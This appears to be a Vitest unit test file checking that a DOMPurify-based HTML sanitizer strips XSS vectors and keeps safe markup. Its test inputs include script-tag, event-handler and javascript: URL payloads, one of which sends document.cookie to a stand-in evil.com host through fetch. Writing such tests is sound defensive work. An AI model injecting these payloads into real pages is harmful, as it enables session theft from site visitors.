// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import { sanitizeHtml } from './sanitize'

describe('XSS prevention — DOMPurify sanitization', () => {
  it('strips <script> tags', () => {
    const input = '<script>alert(1)</script>'
    const result = sanitizeHtml(input)
    expect(result).not.toContain('<script>')
    expect(result).not.toContain('alert(1)')
  })

  it('strips onerror event handlers from <img>', () => {
    const input = '<img onerror="alert(1)" src="x">'
    const result = sanitizeHtml(input)
    expect(result).not.toContain('onerror')
    expect(result).not.toContain('alert(1)')
  })

  it('strips onclick event handlers', () => {
    const input = '<div onclick="alert(1)">click me</div>'
    const result = sanitizeHtml(input)
    expect(result).not.toContain('onclick')
  })

  it('strips javascript: protocol in href', () => {
    const input = '<a href="javascript:alert(1)">link</a>'
    const result = sanitizeHtml(input)
    expect(result).not.toContain('javascript:')
  })

  it('preserves safe plain text', () => {
    const input = 'Hello, this is safe text.'
    expect(sanitizeHtml(input)).toBe(input)
  })

  it('preserves safe HTML tags like <b> and <em>', () => {
    const input = '<b>bold</b> and <em>italic</em>'
    expect(sanitizeHtml(input)).toBe(input)
  })

  it('preserves safe <a> tags with normal href', () => {
    const input = '<a href="https://example.com">link</a>'
    expect(sanitizeHtml(input)).toBe(input)
  })

  it('handles empty string', () => {
    expect(sanitizeHtml('')).toBe('')
  })

  it('strips nested XSS in attributes', () => {
    const input = '<img src="x" onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">'
    const result = sanitizeHtml(input)
    expect(result).not.toContain('onerror')
    expect(result).not.toContain('fetch')
  })
})
